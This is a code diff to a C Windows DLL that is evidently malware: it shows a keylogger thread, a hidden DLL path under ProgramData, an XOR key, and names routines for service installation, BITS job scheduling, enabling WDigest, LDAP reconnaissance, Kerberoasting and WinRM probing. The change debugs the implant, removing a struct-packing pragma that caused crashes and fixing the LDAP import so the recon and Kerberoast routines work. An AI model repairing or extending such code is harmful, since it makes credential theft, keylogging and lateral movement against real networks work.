@@ -17,8 +17,13 @@
 #include <stdio.h>
 
 
-#pragma pack(push, 4)
-
+// ponytail: #pragma pack(push,4) removed — it globally 4-byte-aligns all
+// subsequent structs including SHELLEXECUTEINFOW, STARTUPINFOW, and
+// PROCESS_INFORMATION. Win32 APIs expect natural (8-byte on x64) alignment.
+// MinGW doesn't re-pack its own headers, so the mismatch caused
+// ACCESS_VIOLATION (0xC0000005) when Windows read mis-aligned struct fields
+// in InstallService, ScheduleBitsJob, EnableWDigest, etc. — WorkerThread
+// AV'd ~15s in at the first CreateProcessW call.
 #define XOR_KEY 0xAA
 #define DLL_PATH "C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
 #define DLL_PATH_W L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
@@ -438,7 +443,10 @@ static DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
 typedef struct ldap LDAP;
 typedef struct ldapmsg LDAPMessage;
 
-typedef LDAP* (WINAPI *ldap_initW_t)(PWSTR, ULONG);
+// ponytail: ldap_initW does not exist on stock wldap32.dll — only ldap_init
+// (ANSI, PSTR HostName). Using ldap_initW silently returns NULL, causing
+// DoLDAPRecon / DoKerberoast / DoWinRMProbe to bail at their first call.
+typedef LDAP* (WINAPI *ldap_init_t)(PSTR, ULONG);
 typedef ULONG (WINAPI *ldap_bind_sW_t)(LDAP*, PWSTR, PWSTR*, ULONG);
 typedef ULONG (WINAPI *ldap_search_sW_t)(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
 typedef LDAPMessage* (WINAPI *ldap_first_entry_t)(LDAP*, LDAPMessage*);
@@ -450,7 +458,7 @@ typedef ULONG (WINAPI *ldap_unbind_t)(LDAP*);
 
 typedef struct {
     HMODULE hMod;
-    ldap_initW_t           ldap_init;
+    ldap_init_t            ldap_init;
     ldap_bind_sW_t         ldap_bind_s;
     ldap_search_sW_t       ldap_search_s;
     ldap_first_entry_t     ldap_first_entry;
@@ -464,7 +472,7 @@ typedef struct {
 static BOOL LdapLoad(LDAP_API* api) {
     api->hMod = LoadLibraryW(L"wldap32.dll");
     if (!api->hMod) return FALSE;
-    api->ldap_init       = (ldap_initW_t)      GetProcAddress(api->hMod, "ldap_initW");
+    api->ldap_init       = (ldap_init_t)        GetProcAddress(api->hMod, "ldap_init");
     api->ldap_bind_s     = (ldap_bind_sW_t)    GetProcAddress(api->hMod, "ldap_bind_sW");
     api->ldap_search_s   = (ldap_search_sW_t)  GetProcAddress(api->hMod, "ldap_search_sW");
     api->ldap_first_entry= (ldap_first_entry_t) GetProcAddress(api->hMod, "ldap_first_entry");
@@ -1465,4 +1473,4 @@ __declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
     return S_OK;
 }
 
-#pragma pack(pop)
+// ponytail: was #pragma pack(pop) — removed with the matching push above.
